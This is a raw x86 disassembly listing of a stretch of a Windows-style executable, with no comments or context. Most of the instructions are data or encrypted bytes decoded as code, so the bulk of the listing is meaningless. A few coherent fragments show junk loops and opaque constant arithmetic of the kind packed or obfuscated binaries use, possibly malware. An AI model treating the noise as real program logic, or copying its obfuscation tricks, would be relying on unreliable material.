  410843:	cmp    BYTE PTR [esi+edi*1-0x56],0xf1
  410848:	adc    eax,0xba2f07a0
  41084d:	jne    0x410868
  41084f:	cmp    DWORD PTR [esi-0x1b],edx
  410852:	loope  0x4108b8
  410854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410855:	scas   eax,DWORD PTR es:[edi]
  410856:	cmp    DWORD PTR [edx+0x6bf305b0],esi
  41085c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41085d:	sub    edi,DWORD PTR [edx+0x73]
  410860:	shl    ch,1
  410862:	and    eax,0x178085f5
  410867:	pop    edi
  410868:	stc    
  410869:	xor    esi,DWORD PTR [ebx]
  41086b:	xor    BYTE PTR [edi+0xd],0xb2
  41086f:	icebp  
  410870:	push   ds
  410871:	pop    ecx
  410872:	cmp    BYTE PTR [edx+0x50],bh
  410875:	dec    esi
  410876:	loope  0x41081e
  410878:	dec    edi
  410879:	fadd   QWORD PTR [edx]
  41087b:	out    0x16,eax
  41087d:	inc    edx
  41087e:	and    al,0x8
  410880:	sub    eax,0xcd46a308
  410885:	test   BYTE PTR [ebx+0x30],cl
  410888:	xchg   ebx,eax
  410889:	mov    al,ds:0x231095cb
  41088e:	pop    ebp
  41088f:	inc    ecx
  410890:	call   0xb6a1fc25
  410895:	mov    ah,0x57
  410897:	lods   al,BYTE PTR ds:[esi]
  410898:	jnp    0x410896
  41089a:	scas   al,BYTE PTR es:[edi]
  41089b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41089c:	ins    BYTE PTR es:[edi],dx
  41089d:	pop    eax
  41089e:	mov    ah,0x68
  4108a0:	mov    dl,0xe7
  4108a2:	jo     0x41084a
  4108a4:	sub    eax,0xda35148c
  4108a9:	push   0xffffffe2
  4108ab:	sbb    bl,BYTE PTR [ebx]
  4108ad:	call   0xe50238c0
  4108b2:	(bad)  
  4108b3:	mov    WORD PTR [ecx],ss
  4108b5:	inc    esi
  4108b6:	push   0x3d
  4108b8:	and    al,0x82
  4108ba:	jl     0x41084e
  4108bc:	rcr    DWORD PTR [eax],1
  4108be:	jmp    0x343e:0x1a728c99
  4108c5:	mov    cl,0xd
  4108c7:	dec    ebx
  4108c8:	push   ss
  4108c9:	mov    esi,DWORD PTR [ecx]
  4108cb:	fisttp WORD PTR [esi]
  4108cd:	pop    ebx
  4108ce:	xchg   DWORD PTR [esp+eiz*2],esi
  4108d1:	mov    DWORD PTR [edx+0x76],0x9204bf30
  4108d8:	mov    eax,0xf3851eb6
  4108dd:	arpl   WORD PTR [ebx-0x46d12f30],bx
  4108e3:	xor    esp,edi
  4108e5:	and    DWORD PTR [ebp+0x6bb5a83],esp
  4108eb:	scas   eax,DWORD PTR es:[edi]
  4108ec:	ja     0x4108a7
  4108ee:	push   ds
  4108ef:	cdq    
  4108f0:	mov    ds:0x518f280c,eax
  4108f5:	ret    
  4108f6:	mov    eax,DWORD PTR [ecx+0x11]
  4108f9:	fldcw  WORD PTR [eax]
  4108fb:	jae    0x410972
  4108fd:	add    DWORD PTR [eax+0x3d],edx
  410900:	sbb    al,0x2b
  410902:	ds std 
  410904:	aas    
  410905:	out    dx,eax
  410906:	push   cs
  410907:	push   esp
  410908:	cmp    ah,0x4d
  41090b:	inc    esp
  41090c:	rcr    cl,0xa8
  41090f:	dec    edx
  410910:	sbb    cl,BYTE PTR [edi-0x30]
  410913:	xor    DWORD PTR [edx-0x1139924f],ecx
  410919:	pusha  
  41091a:	add    ebp,DWORD PTR [edx+eax*4+0x583bb54]
  410921:	mov    al,0xaf
  410923:	test   BYTE PTR [ebx-0x32022960],al
  410929:	or     al,0x5f
  41092b:	push   ebx
  41092c:	mov    WORD PTR [edx-0x5f],ds
  41092f:	(bad)  [esi+0x77]
  410932:	adc    esp,DWORD PTR [esi+0x7d]
  410935:	aad    0x2d
  410937:	out    0xe6,eax
  410939:	pop    esi
  41093a:	push   ebx
  41093b:	mov    dl,0x7
  41093d:	and    dh,BYTE PTR [edx]
  41093f:	repnz mov eax,ds:0x5b16048a
  410945:	cmp    bl,BYTE PTR [ebp+0x7a7f9283]
  41094b:	fnsave [eax+0x1c623533]
  410951:	cwde   
  410952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410953:	cld    
  410954:	ss repz call 0x4639:0xc103ed8c
  41095d:	push   esp
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4345ef,0x0
  41099b:	mov    eax,ds:0x4345ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4345ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4345ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4345ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4345ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4345ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4345ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4346cf
  4109f5:	adc    DWORD PTR ds:0x4345e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4346bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434607,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	stos   DWORD PTR es:[edi],eax
  410a2e:	jno    0x410a80
  410a30:	pop    ebx
  410a31:	stos   BYTE PTR es:[edi],al
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410a7a
  410a3a:	push   edx
  410a3b:	call   0xad8a2655
  410a40:	dec    esp
  410a41:	in     eax,dx
  410a42:	sbb    eax,0xed735774
  410a47:	dec    edi
  410a48:	sbb    BYTE PTR [ecx],bl
  410a4a:	int3   
  410a4b:	xchg   ebp,eax
  410a4c:	pop    eax
  410a4d:	adc    eax,0xbda8bb92
  410a52:	les    ebx,FWORD PTR [edx]
  410a54:	inc    ebx
  410a55:	add    dh,BYTE PTR [ecx-0x39]
  410a58:	jno    0x410aa8
  410a5a:	imul   BYTE PTR ds:0xa7f4fb33
  410a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a61:	xchg   edi,eax
  410a62:	xchg   esp,eax
  410a63:	test   al,0x23
  410a65:	in     eax,0x5
  410a67:	pop    ss
  410a68:	push   edx
  410a69:	or     dl,0x18
  410a6c:	and    BYTE PTR [edx],bh
  410a6e:	cmp    ch,ah
  410a70:	jns    0x410a0f
  410a72:	fdivr  QWORD PTR [edi+0x62]
  410a75:	inc    ebx
  410a76:	(bad)  
  410a77:	xchg   ecx,eax
  410a78:	ins    BYTE PTR es:[edi],dx
  410a79:	mov    esi,0x479efd26
  410a7e:	mov    ah,0x54
  410a80:	iret   
  410a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a82:	not    DWORD PTR [edi-0x4f]
  410a85:	mov    ah,0xe9
  410a87:	pop    ecx
  410a88:	out    dx,eax
  410a89:	loop   0x410abb
  410a8b:	ss pop esp
  410a8d:	jne    0x410a5e
  410a8f:	mov    esp,0xa3e72a01
  410a94:	fcomp  DWORD PTR [edx]
  410a96:	fistp  WORD PTR [edx+0xecb41f5]
  410a9c:	push   edi
  410a9d:	sub    eax,eax
  410a9f:	xor    bl,BYTE PTR [edx]
  410aa1:	ja     0x410ad6
  410aa3:	pop    esp
  410aa4:	test   BYTE PTR [ebp+0x3f],ch
  410aa7:	inc    edx
  410aa8:	jo     0x410a9a
  410aaa:	mov    dh,0x52
  410aac:	repz jmp 0x410a4d
  410aaf:	or     bh,al
  410ab1:	mov    ch,0x55
  410ab3:	mov    ch,ch
  410ab5:	and    eax,0xa03b44bb
  410aba:	test   DWORD PTR [edi-0x5f],esi
  410abd:	mov    edx,0xdf279e32
  410ac2:	or     eax,0x8c0fc9b7
  410ac7:	daa    
  410ac8:	into   
  410ac9:	adc    al,0xf5
  410acb:	neg    BYTE PTR [eax-0x45]
  410ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410acf:	fcom   QWORD PTR [ebp-0x4dda2f65]
  410ad5:	and    ah,dh
  410ad7:	push   ecx
  410ad8:	xchg   ebp,eax
  410ad9:	cwde   
  410ada:	lock add eax,0x8ee61eab
  410ae0:	jae    0x410a75
  410ae2:	mul    DWORD PTR [edi]
  410ae4:	int    0xba
  410ae6:	pop    ebx
  410ae7:	add    al,0xc1
  410ae9:	push   cs
  410aea:	xchg   ecx,eax
  410aeb:	mov    ebx,0x49b946d2
  410af0:	xor    BYTE PTR [esi+0x49c239d9],0x4e
  410af7:	jne    0x410a7e
  410af9:	jge    0x410b3c
  410afb:	mov    ?,WORD PTR [edx]
  410afd:	pop    ecx
  410afe:	jg     0x410adc
  410b00:	out    dx,eax
  410b01:	mov    eax,0x44a6002d
  410b06:	ret    
  410b07:	mov    ds:0xe0df15c3,eax
  410b0c:	cmp    BYTE PTR [edi*8+0xe5e46ac],ah
  410b13:	mov    edi,0x5f9f99d8
  410b18:	xchg   BYTE PTR [edx+0x21],dl
  410b1b:	xor    bl,BYTE PTR [ebx+ebx*4+0x40]
  410b1f:	dec    esi
  410b20:	(bad)  
  410b21:	sub    al,0x3f
  410b23:	xchg   edi,eax
  410b25:	iret   
  410b26:	lods   al,BYTE PTR ds:[esi]
  410b27:	add    dl,BYTE PTR [ecx-0x4b]
  410b2a:	dec    ebp
  410b2b:	push   edi
  410b2c:	in     eax,0x93
  410b2e:	mov    eax,ds:0xef803b2e
  410b33:	push   es
  410b34:	mov    al,ds:0xeb831d32
  410b39:	xchg   ebx,eax
  410b3a:	pop    ecx
  410b3b:	cmc    
  410b3c:	daa    
  410b3d:	mov    ds:0x6cbfb2e2,al
  410b42:	jecxz  0x410b38
  410b44:	(bad)  [ebx+0x1]
  410b47:	pop    ebp
  410b48:	test   BYTE PTR [ebp-0x55],cl
  410b4b:	mov    ah,0xa5
  410b4d:	or     esi,DWORD PTR [eax+0x40]
  410b50:	mov    ecx,0x1ee6540e
  410b55:	(bad)  
  410b56:	mov    dl,0xa2
  410b58:	cwde   
  410b59:	xchg   ecx,eax
  410b5a:	sub    DWORD PTR [edx],0x3d
  410b5d:	xor    eax,0x3e56e6ef
  410b62:	cmp    eax,0x1f80a673
  410b67:	(bad)  
  410b69:	dec    ebp
  410b6a:	shl    BYTE PTR [ebx+ebp*8],1
  410b6d:	cmp    eax,0x3ab6269
  410b72:	cmp    eax,0x4e0b7995
  410b77:	xchg   esp,eax
  410b78:	out    dx,al
  410b79:	lods   al,BYTE PTR ds:[esi]
  410b7a:	mov    al,ds:0x89c78608
  410b7f:	xor    BYTE PTR [eax-0x5c863b8d],dh
  410b85:	push   0x1af75cc0
  410b8a:	or     DWORD PTR [esi],esp
  410b8c:	pop    es
  410b8d:	pop    ss
  410b8e:	push   ss
  410b8f:	sub    al,0x81
  410b91:	retf   
  410b92:	adc    esp,DWORD PTR [eax-0x471cdf5a]
  410b98:	dec    esp
  410b99:	jnp    0x410b84
  410b9b:	mov    ebp,0x25082037
  410ba0:	jle    0x410b5f
  410ba2:	xchg   ebp,eax
  410ba3:	mov    DWORD PTR [edx-0x58],ecx
  410ba6:	fs push ecx
  410ba8:	mov    ds:0xe137ed43,eax
  410bad:	fisub  DWORD PTR [esi+0x4]
  410bb0:	and    eax,0x868e8db1
  410bb5:	mov    dh,al
  410bb7:	enter  0xd6f4,0x6f
  410bbb:	or     DWORD PTR [eax-0x2e],0xd7db5f02
  410bc2:	add    eax,0x835c766b
  410bc7:	push   edx
  410bc8:	inc    edi
  410bc9:	sub    al,0x1d
  410bcb:	xor    BYTE PTR [eax+0x41],cl
  410bce:	mov    bl,0xce
  410bd0:	repz imul ebx,DWORD PTR [ebx+0x76],0x69ce24d0
  410bd8:	repnz inc ebx
  410bda:	cld    
  410bdb:	sub    eax,0xf53f773e
  410be0:	xor    BYTE PTR ds:0xf3e20240,dh
  410be6:	pop    es
  410be7:	mov    DWORD PTR [ebx-0x2],esp
  410bea:	dec    ebx
  410beb:	push   edi
  410bec:	dec    ebp
  410bed:	sti    
  410bee:	mov    bl,0xf3
  410bf0:	pop    ds
  410bf1:	lods   eax,DWORD PTR ds:[esi]
  410bf2:	lock mov eax,ds:0x850edcb7
  410bf8:	dec    eax
  410bf9:	jg     0x410c5b
  410bfb:	add    al,0x8f
  410bfd:	xchg   BYTE PTR [edi],ah
  410bff:	stos   DWORD PTR es:[edi],eax
  410c00:	je     0x410c50
  410c02:	and    BYTE PTR [edx+0x57],dh
  410c05:	out    0xfe,eax
  410c07:	idiv   BYTE PTR [esi+0x10]
  410c0a:	sbb    BYTE PTR [edx+edi*2],al
  410c0d:	sub    eax,0xbff00703
  410c12:	fsub   QWORD PTR [ebx+eiz*4]
  410c15:	call   0x1219:0x9f89843c
  410c1c:	or     DWORD PTR [edx+0x59fc662c],esp
  410c22:	and    eax,0x2f219d9b
  410c27:	jmp    0x398f:0xabdeb9f5
  410c2e:	or     DWORD PTR [ebx+0x5d],ebx
  410c31:	xchg   DWORD PTR [esi],ecx
  410c33:	pushf  
  410c34:	cmp    bl,dh
  410c36:	add    BYTE PTR [edi+0x53584e6b],ah
  410c3c:	mov    eax,ds:0x5e550f79
  410c41:	(bad)  
  410c42:	jns    0x410c25
  410c44:	stos   BYTE PTR es:[edi],al
  410c45:	call   0xffd:0x3020c7f4
  410c4c:	mov    ds:0x7014ad3a,eax
  410c51:	mov    esi,0xe52f4ded
  410c56:	and    eax,0x8f6b61a0
  410c5b:	retf   0xd30b
  410c5e:	push   ebx
  410c5f:	(bad)  
  410c61:	pusha  
  410c62:	loopne 0x410c5a
  410c64:	mov    ?,WORD PTR [eax]
  410c66:	xor    ebp,esi
  410c68:	int    0x18
  410c6a:	sub    al,0xa8
  410c6c:	dec    esp
  410c6d:	les    ebp,FWORD PTR [eax]
  410c6f:	(bad)  
  410c70:	cmc    
  410c71:	lock pop DWORD PTR [esi-0x67]
  410c75:	dec    esi
  410c76:	xchg   DWORD PTR [edx-0x28],edx
  410c79:	aas    
  410c7a:	adc    eax,0x3ed1359a
  410c7f:	mov    ebp,0x64b116ce
  410c84:	ds push 0x51428d3
  410c8a:	or     BYTE PTR [ecx+0x36],dl
  410c8d:	scas   al,BYTE PTR es:[edi]
  410c8e:	push   esp
  410c8f:	add    eax,DWORD PTR [eax-0xc]
  410c92:	sub    bh,al
  410c94:	fcom   DWORD PTR [edx+ebx*1+0x55]
  410c98:	mov    ds:0xd19745ae,al
  410c9d:	mov    edi,0x61b74d41
  410ca2:	mov    eax,0xa63993d6
  410ca7:	int3   
  410ca8:	hlt    
  410ca9:	inc    ecx
  410caa:	ret    0x338e
  410cad:	and    ebp,DWORD PTR [eax-0xa72d9a0]
  410cb3:	aas    
  410cb4:	push   edi
  410cb5:	(bad)  
  410cb6:	into   
  410cb7:	dec    edx
  410cb8:	lahf   
  410cb9:	fisttp WORD PTR [edx]
  410cbb:	lods   eax,DWORD PTR ds:[esi]
  410cbc:	mov    al,0x6e
  410cbe:	add    dl,BYTE PTR [esp+edx*2-0x3e143f6b]
  410cc5:	pushw  ss
  410cc7:	cmp    BYTE PTR [esi-0x554c33ce],0x1f
  410cce:	add    DWORD PTR [eax+0x60],edi
  410cd1:	inc    ebp
  410cd2:	push   ds
  410cd3:	mov    eax,ds:0x4cad6e5e
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x4346c7
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x4345e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43470b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434713,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4346c7,0x434683
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434707,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43468f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0x2bba1d82],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d59
  410d7a:	xor    BYTE PTR [edi],dh
  410d7c:	fidivr DWORD PTR [ebp-0x55549ec5]
  410d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d83:	inc    edi
  410d84:	xchg   DWORD PTR [eax],eax
  410d86:	or     DWORD PTR [ebp+0x6224c27f],ebx
  410d8c:	pop    edi
  410d8d:	adc    eax,0xd5c49b94
  410d92:	ror    ebx,0x64
  410d95:	in     eax,0x68
  410d97:	mov    edi,0xdca56873
  410d9c:	and    DWORD PTR [ebp+edi*2-0x1a],ebp
  410da0:	dec    ecx
  410da1:	dec    ecx
  410da2:	nop
  410da3:	lahf   
  410da4:	dec    ecx
  410da5:	adc    al,cl
  410da7:	add    BYTE PTR [esi],dl
  410da9:	stc    
  410daa:	mov    edx,0xd928cfad
  410daf:	leave  
  410db0:	adc    ah,BYTE PTR [eax+0x3e]
  410db3:	push   edi
  410db4:	mov    esp,0xe270cfba
  410db9:	push   eax
  410dba:	je     0x410db7
  410dbc:	push   cs
  410dbd:	fdivr  DWORD PTR [ebx+eax*2]
  410dc0:	xchg   BYTE PTR [edi+0x1d],dh
  410dc3:	pop    es
  410dc4:	or     DWORD PTR [esi-0x2e4a7cf4],esp
  410dca:	pop    esp
  410dcb:	pop    eax
  410dcc:	aas    
  410dcd:	adc    al,0xaf
  410dcf:	mov    bl,0x37
  410dd1:	adc    ah,cl
  410dd3:	jb     0x410de4
  410dd5:	sbb    edi,DWORD PTR [ecx-0x7f]
  410dd8:	loop   0x410e3d
  410dda:	and    bh,BYTE PTR [esi-0x46c42b45]
  410de0:	jno    0x410e5e
  410de2:	dec    esp
  410de3:	pusha  
  410de4:	gs jno 0x410da4
  410de7:	stos   BYTE PTR es:[edi],al
  410de8:	aad    0x3b
  410dea:	inc    edx
  410deb:	je     0x410de5
  410ded:	iret   
  410dee:	sahf   
  410def:	cdq    
  410df0:	call   0x5dc0:0xd148bc02
  410df7:	fst    st(5)
  410df9:	fnstsw WORD PTR fs:[eax]
  410dfc:	(bad)  
  410dfd:	add    BYTE PTR [eax],dh
  410dff:	popf   
  410e00:	outs   dx,BYTE PTR ds:[esi]
  410e01:	adc    eax,0xd591b20a
  410e06:	enter  0x5748,0x56
  410e0a:	xchg   esi,eax
  410e0b:	aaa    
  410e0c:	or     BYTE PTR [eax+0x71],bl
  410e0f:	retf   0x73ff
  410e12:	mov    ds:0x208441fb,al
  410e17:	imul   esi,DWORD PTR [ebp+0x44],0xffffff9a
  410e1b:	fs dec esi
  410e1d:	add    BYTE PTR [esi],0x39
  410e20:	das    
  410e21:	pusha  
  410e22:	sub    eax,0x237d48c3
  410e27:	scas   al,BYTE PTR es:[edi]
  410e28:	(bad)  
  410e29:	and    al,0xf8
  410e2b:	sbb    dh,BYTE PTR [esp+ebx*1+0x54b41aeb]
  410e32:	and    DWORD PTR [edx-0x469e0236],eax
  410e38:	nop
  410e39:	sbb    DWORD PTR [ebx],ecx
  410e3b:	dec    ecx
  410e3c:	js     0x410e72
  410e3e:	es and edi,ecx
  410e41:	sbb    eax,0xe77da9f
  410e46:	xor    DWORD PTR [edx],0x9f776d3b
  410e4c:	in     al,dx
  410e4d:	mov    ecx,0xb7919247
  410e52:	out    dx,al
  410e53:	jge    0x410e9b
  410e55:	in     eax,dx
  410e56:	pusha  
  410e57:	and    dl,BYTE PTR [edi+ebp*2-0x66]
  410e5b:	sub    ch,al
  410e5d:	loope  0x410e1b
  410e5f:	int    0x61
  410e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e62:	pop    ds
  410e63:	sub    ah,cl
  410e65:	das    
  410e66:	sbb    ah,BYTE PTR [edx]
  410e68:	push   ss
  410e69:	mov    WORD PTR [ecx],gs
  410e6b:	sub    BYTE PTR [ecx-0x74],al
  410e6e:	xchg   esp,eax
  410e6f:	sbb    bh,bh
  410e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e72:	add    al,0xed
  410e74:	shl    esp,1
  410e76:	dec    edi
  410e77:	(bad)  
  410e78:	mov    cl,BYTE PTR [eax]
  410e7a:	sub    edi,DWORD PTR [ebx-0x6728effc]
  410e80:	or     DWORD PTR [esi],esi
  410e82:	push   0x834f2aa4
  410e87:	test   BYTE PTR [esi],bh
  410e89:	pop    ebx
  410e8a:	mov    esi,DWORD PTR [esi]
  410e8c:	xchg   edx,eax
  410e8d:	dec    ecx
  410e8e:	fwait
  410e8f:	mov    al,ds:0x15b53f02
  410e94:	add    ebp,DWORD PTR [eax+ebx*8]
  410e97:	pusha  
  410e98:	pop    es
  410e99:	fcomp  DWORD PTR [eax]
  410e9b:	in     eax,0x5b
  410e9d:	cmc    
  410e9e:	ins    DWORD PTR es:[edi],dx
  410e9f:	mov    bh,0x39
  410ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ea2:	iret   
  410ea3:	dec    edx
  410ea4:	pop    ebp
  410ea5:	and    cl,bl
  410ea7:	out    dx,eax
  410ea8:	dec    ebp
  410ea9:	dec    ebx
  410eaa:	rcl    DWORD PTR [edx-0x38791790],cl
  410eb0:	xor    bl,BYTE PTR es:[ebx-0x6f5eccbf]
  410eb7:	jnp    0x410ec5
  410eb9:	lds    ebx,FWORD PTR [ebx+0x43]
  410ebc:	xor    eax,0x9c7255e7
  410ec1:	jmp    FWORD PTR [eax]
  410ec3:	mov    ds:0x9d95e709,al
  410ec8:	adc    DWORD PTR [ecx+0x5ba68cf0],0x6f
  410ecf:	sbb    eax,0x7349a34d
  410ed4:	ret    
  410ed5:	cwde   
  410ed6:	icebp  
  410ed7:	push   eax
  410ed8:	xor    ebp,esp
  410eda:	sti    
  410edb:	and    al,dh
  410edd:	retf   0xa2b0
  410ee0:	lahf   
  410ee1:	push   cs
  410ee2:	pushf  
  410ee3:	cmp    DWORD PTR ds:0x4f5fff35,eax
  410ee9:	adc    DWORD PTR [ecx+0x6eb3530a],edi
  410eef:	xor    bh,cl
  410ef1:	and    eax,0x99a2212b
  410ef6:	and    BYTE PTR [ebx],0xf0
  410ef9:	lds    ecx,FWORD PTR [edi+0x642b732f]
  410eff:	cmc    
  410f00:	vpandn xmm6,xmm2,XMMWORD PTR [ecx-0x22]
  410f05:	xor    eax,0x35d186ab
  410f0a:	cwde   
  410f0b:	or     eax,0x4d8b2c6
  410f10:	stos   DWORD PTR es:[edi],eax
  410f11:	add    edx,0x57
  410f14:	push   ecx
  410f15:	cmp    eax,0xcf05daf3
  410f1a:	jb     0x410f72
  410f1c:	ret    0xce8
  410f1f:	iret   
  410f20:	sub    DWORD PTR [edi],edi
  410f22:	push   esp
  410f23:	cmp    bh,al
  410f25:	or     al,0xc4
  410f27:	outs   dx,BYTE PTR ds:[esi]
  410f28:	add    esp,esi
  410f2a:	rol    BYTE PTR [ebp-0x111d0878],1
  410f30:	adc    edi,DWORD PTR [eax]
  410f32:	adc    dh,ah
  410f34:	mov    edx,0xb3e4b7f7
  410f39:	lock int 0x4f
  410f3c:	call   0xaebe71f9
  410f41:	fadd   DWORD PTR [ebx+0x40]
  410f44:	in     eax,0xc7
  410f46:	mov    bl,0x2c
  410f48:	pop    ss
  410f49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f4a:	das    
  410f4b:	mov    esp,0xb77d4ccd
  410f50:	cmp    DWORD PTR [edx],0xaa0f4b35
  410f56:	je     0x410f03
  410f58:	fldcw  WORD PTR [edi-0x239e785a]
  410f5e:	jmp    0xe3be702a
  410f63:	nop
  410f64:	mov    al,0xb3
  410f66:	shl    BYTE PTR [edx+0x37fe7e07],0x40
  410f6d:	cmc    
  410f6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f6f:	push   esp
  410f70:	aad    0x9
  410f72:	mov    bh,0xf4
  410f74:	sbb    dl,al
  410f76:	dec    edx
  410f77:	inc    ebx
  410f78:	nop
  410f79:	stos   DWORD PTR es:[edi],eax
  410f7a:	jb     0x410f25
  410f7c:	push   es
  410f7d:	mov    dh,0xc8
  410f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f80:	or     ebx,edi
  410f82:	add    ebp,DWORD PTR [ecx]
  410f84:	test   al,0xcf
  410f86:	dec    eax
  410f87:	out    0x22,eax
  410f89:	scas   eax,DWORD PTR es:[edi]
  410f8a:	fs cmp dl,0x12
  410f8e:	std    
  410f8f:	mul    BYTE PTR [ebp-0x18d1d606]
  410f95:	enter  0x52da,0x89
  410f99:	and    esi,DWORD PTR [ebp-0x5a]
  410f9c:	test   BYTE PTR [edi],ch
  410f9e:	leave  
  410f9f:	xor    ecx,DWORD PTR [eax-0x29]
  410fa2:	je     0x410f75
  410fa4:	adc    dl,BYTE PTR [ecx-0x7b07cb55]
  410faa:	mov    esp,0xc7a9749
  410faf:	xchg   ecx,eax
  410fb0:	xor    DWORD PTR [ecx],esi
  410fb2:	mov    esi,0x780d374e
  410fb7:	jb     0x410ff5
  410fb9:	loopne 0x410fbf
  410fbb:	inc    esi
  410fbc:	dec    eax
  410fbd:	push   esp
  410fbe:	(bad)  
  410fbf:	cmp    dl,BYTE PTR [edx+0x37a1c1fa]
  410fc5:	out    0x81,al
  410fc7:	fwait
  410fc8:	outs   dx,BYTE PTR ds:[esi]
  410fc9:	jp     0x411001
  410fcb:	(bad)  
  410fcc:	daa    
  410fcd:	je     0x410fa0
  410fcf:	in     al,0x28
  410fd1:	outs   dx,DWORD PTR ds:[esi]
  410fd2:	inc    ebp
  410fd3:	out    0x5,al
  410fd5:	ret    
  410fd6:	es xor esp,ebp
  410fd9:	or     ah,ah
  410fdb:	jnp    0x411018
  410fdd:	and    cl,BYTE PTR [edx-0x53477a2e]
  410fe3:	mov    bh,0x2a
  410fe5:	popf   
  410fe6:	dec    edi
  410fe7:	daa    
  410fe8:	dec    esp
  410fe9:	inc    esp
  410fea:	inc    ecx
  410feb:	(bad)  [esi+0x12]
  410fee:	imul   esi,DWORD PTR [ecx],0x4bbaea1c
  410ff4:	push   esp
  410ff5:	loop   0x410f79
  410ff7:	ss push esp
  410ff9:	push   cs
  410ffa:	pop    ebx
  410ffb:	jle    0x410ff0
  410ffd:	outs   dx,DWORD PTR ds:[esi]
  410ffe:	push   eax
  410fff:	xchg   ebx,eax
  411000:	call   0x9437:0xe7f4fcb7
  411007:	mov    esp,DWORD PTR [edi+0x21]
  41100a:	mov    edi,0xf442c2c2
  41100f:	inc    esp
  411010:	int3   
  411011:	dec    ebx
  411012:	inc    ebx
  411013:	sbb    WORD PTR [ebx+0xb],0x3a
  411018:	add    ecx,0xffcd8d67
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x51324754
  411040:	test   BYTE PTR [edx+0x7e7e4f68],dh
  411046:	popf   
  411047:	js     0x4110c7
  411049:	jle    0x411004
  41104b:	fbld   TBYTE PTR [esp]
  41104e:	mov    ds,WORD PTR [edi-0x1a5ee192]
  411054:	jge    0x4110b6
  411056:	not    bh
  411058:	mov    ds:0x9cff72a9,eax
  41105d:	out    0x27,eax
  41105f:	loope  0x411024
  411061:	jnp    0x41103a
  411063:	sbb    esi,ecx
  411065:	lods   eax,DWORD PTR ds:[esi]
  411066:	and    BYTE PTR [eax],bl
  411068:	pop    ss
  411069:	leave  
  41106a:	push   DWORD PTR [esi+eax*8+0x4a23301a]
  411071:	push   edx
  411072:	hlt    
